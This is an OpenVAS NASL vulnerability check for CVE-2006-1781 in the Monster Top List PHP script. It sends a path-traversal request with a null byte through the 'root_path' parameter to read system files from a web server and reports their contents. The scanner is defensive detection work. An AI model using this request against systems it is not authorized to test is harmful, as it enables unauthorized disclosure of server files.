# OpenVAS Vulnerability Test
# $Id: mtl_remote_file_include.nasl 11669 2018-09-28 08:44:24Z jschulte $
# Description: Monster Top List Remote File Include
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2008 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80073");
  script_version("$Revision: 11669 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-28 10:44:24 +0200 (Fri, 28 Sep 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(17546);
  script_cve_id("CVE-2006-1781");
  script_xref(name:"OSVDB", value:"24650");
  script_name("Monster Top List Remote File Include");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2008 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The remote web server contains a PHP application that is affected by a
  remote file include vulnerability.

  Description :

  The remote host is running Monster Top List, a site rating script
  written in PHP.

  The installed version of Monster Top List fails to sanitize user input
  to the 'root_path' parameter in sources/functions.php before using it
  to include PHP code from other files.  An unauthenticated attacker may
  be able to read arbitrary local files or include a file from a remote
  host that contains commands which will be executed on the remote host
  subject to the privileges of the web server process.

  This flaw is only exploitable if PHP's 'register_globals' is enabled.");
  script_xref(name:"URL", value:"http://pridels.blogspot.com/2006/04/monstertoplist.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

files = traversal_files();
vtstring = get_vt_string();

foreach dir(make_list_unique("/toplist", cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  foreach pattern(keys(files)) {

    file = files[pattern];

    req = http_get( item:string( dir, "/sources/functions.php?root_path=/" + file + "%00"), port:port );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) continue;

    # There's a problem if...
    if (
        # there's an entry for root or...
        egrep(pattern:pattern, string:res) ||
        # we get an error saying "failed to open stream" or "Failed opening".
        #
        # nb: this suggests magic_quotes_gpc was enabled but passing
        #     remote URLs might still work.
        egrep(string:res, pattern:"Warning.+/" + file + "\0sources/func_output\.php.+failed to open stream")

    ) {
      if (egrep(pattern:pattern, string:res)) content = res;

      if (content)
        report = string(
          "Here are the contents of the file '/" + file + "' that\n",
          vtstring, " was able to read from the remote host :\n",
          "\n",
          content
        );
      else report = "";

      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit( 99 );
